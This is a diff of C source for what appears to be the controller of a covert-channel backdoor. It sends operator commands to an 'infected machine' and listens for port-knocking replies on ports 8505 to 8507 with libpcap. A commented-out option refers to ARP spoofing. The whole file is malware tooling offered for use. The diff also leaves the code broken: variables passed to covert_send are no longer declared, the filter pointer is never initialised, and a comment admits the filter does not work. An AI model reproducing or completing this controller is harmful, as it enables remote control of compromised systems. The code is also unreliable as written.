@@ -1,46 +1,109 @@
 #include "main.h"
 
+static void print_usage(void) {
+    puts ("Usage options: \n"
+            "\t--nic      -   network interface to use\n"
+            "\t--target   -   target machine to attack\n"
+            "\t--command  -   command to request from infected machine\n"
+            "\t--localip  -   your local ip\n"
+            /*"\t--delay    -   delays between arp spoofs\n"*/);
+}
+
+static struct option long_options[] = {
+    {"nic",     required_argument,  0,  0 },
+    {"target",  required_argument,  0,  1 },
+    {"command",   required_argument,  0,  2 },
+    {"localip",    required_argument,  0,  3 },
+    //{"delay",   optional_argument,  0,  4 },
+    {0,         0,                  0,  0 }
+};
+
+
+
 int main(int argc, char **argv){
-    char *c = "c";
-    char *sip = CNCIP;
-    char *dip = INFECTEDIP;
-    unsigned short sport = SHPORT;
-    unsigned short dport = SHPORT;
-    unsigned char data[BUFSIZE];
-    if(argc < 2){
-        printf("Usage ./cnc [command]\n");
-	exit(1);
+    int arg;
+    char *nic;
+    char targetip[BUFFERSIZE];
+    char localip[BUFFERSIZE];
+    char *pcapfilter;
+    unsigned char data[BUFFERSIZE];
+    struct filter Filter;
+    /* make sure user has root privilege */
+    if(geteuid() != 0) {
+        printf("Must run as root\n");
+        exit(1);
     }
-	strcpy(data, argv[1]);
-	pattern[0] = 14881; //port 8506 in u_short
-	pattern[1] = 15137; //port 8507 in u_short this is for comparing in the ParseTCP function
-	knocking[0] = 0; // initilizing the knocking
-	knocking[1] = 0;
-	printf("command: %s", data);
+
+    while (1) {
+        int option_index = 0;
+
+        arg = getopt_long(argc, argv, "", long_options, &option_index);
+
+        if(arg == -1) {
+            break;
+        }
+
+        switch (arg) {
+            case 0:
+                /*strncpy(nic, optarg, BUFFERSIZE);
+                printf("Using NIC: %s\n", nic);*/
+                break;
+            case 1:
+                strncpy(targetip, optarg, BUFFERSIZE);
+                //printf("Target ip %s\n", targetip);
+                break;
+            case 2:
+                strncpy(data,optarg, BUFFERSIZE);
+                printf("Command %s\n", data);
+                break;
+            case 3:
+                strncpy(localip, optarg, BUFFERSIZE);
+                //printf("Local ip %s\n", localip);
+                Filter = InitFilter(targetip,localip);
+                PrintFilter(Filter);
+                break;
+            /*case 4:
+                break;*/
+            default: /*  '?' */
+                print_usage();
+                exit(1);
+        }
+    }
+    CreateFilter(Filter, pcapfilter);
+    
 	covert_send(sip, dip, sport, dport, data, 0);
-	Packetcapture();
+	//wait for port knocking
+    printf("Filter: %s\n",pcapfilter);
+	Packetcapture(pcapfilter);
     exit(1);
     return 0;
 }
 
-/*char* iptables(char *port, char *ip, char *protocol){
-    char *iptables;
-    strcat(iptables,IPTABLE);
-    strcat(iptables,protocol);
-    strcat(iptables,SOURCE);
-    strcat(iptables,ip);
-    strcat(iptables,DPORT);
-    strcat(iptables,port);
-    strcat(iptables,ACCEPT);
-    system(iptables);
-    printf("%s", iptables);
+/*char GetLocalIP(char *device){
+	int interfacesocket;
+	if((interfacesocket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == -1){
+		perror("socket():");
+		exit(1);
+	}
+	struct ifreq interface;
+	strncpy(interface.ifr_name, device, IFNAMSIZ);
+
+	if(ioctl(interfacesocket, SIOCGIFADDR, &interface) == -1 ){
+		perror("ioctl SIOCGIFINDEX:");
+		exit(1);
+	}
+
+	printf("%s - %s\n" , device , inet_ntoa(( (struct sockaddr_in *)&interface.ifr_addr )->sin_addr) );
+
+	close(interfacesocket);
+	return (char)inet_ntoa(( (struct sockaddr_in *)&interface.ifr_addr )->sin_addr);
 }*/
 
-int Packetcapture(char *filter){
+int Packetcapture(const char *filter){
     char errorbuffer[PCAP_ERRBUF_SIZE];
     struct bpf_program fp; //holds fp program info
     pcap_if_t *interface_list;
-    bpf_u_int32 netp  = 0; //holds the ip
+    bpf_u_int32 netp; //holds the ip
 
     //find the first network device capable of packet capture
     if(pcap_findalldevs(&interface_list,errorbuffer) == -1){
@@ -54,8 +117,9 @@ int Packetcapture(char *filter){
         printf("pcap_open_live(): %s\n", errorbuffer);
         exit(0);
     }
-
-    if(pcap_compile(interfaceinfo, &fp, filter, 0, netp) == -1){
+//the filter i create isnt working not sure why will fix later
+    //if(pcap_compile(interfaceinfo, &fp, filter, 0, netp) == -1){
+    if(pcap_compile(interfaceinfo, &fp, "tcp and (port 8506 || port 8507 || port 8505)", 0, netp) == -1){
         perror("pcap_comile");
     }
 
